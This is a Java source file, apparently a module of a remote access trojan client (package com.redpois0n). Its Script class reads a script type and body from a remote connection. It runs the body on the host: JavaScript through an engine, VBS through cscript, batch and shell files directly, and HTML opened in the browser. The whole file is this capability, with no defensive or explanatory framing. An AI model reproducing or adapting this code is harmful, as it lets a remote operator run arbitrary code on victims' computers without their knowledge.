package com.redpois0n;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.net.URI;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

import com.redpois0n.common.OperatingSystem;

public class Script {

	public void perform() throws Exception {
		String type = Connection.readLine();
		String content = Connection.readLine();
		if (type.equals("JS")) {
			try {
				ScriptEngineManager factory = new ScriptEngineManager();
				ScriptEngine engine = factory.getEngineByName("JavaScript");
				engine.eval(content);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			File file = File.createTempFile(type.toLowerCase(), "." + type.toLowerCase());
			FileWriter fstream = new FileWriter(file);
			BufferedWriter out = new BufferedWriter(fstream);
			out.write(content);
			out.close();
			if (type.equals("HTML")) {
				java.awt.Desktop.getDesktop().browse(new URI("file://" + file.getAbsolutePath().replace("\\", "/")));
			} else if (type.equals("VBS") && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "cscript", file.getAbsolutePath() });
			} else if (type.equals("BAT") && OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
			} else if (type.equals("SH") && OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
				Runtime.getRuntime().exec(new String[] { "sh", file.getAbsolutePath().replace(" ", "%20") });
			}
		}
	}

}
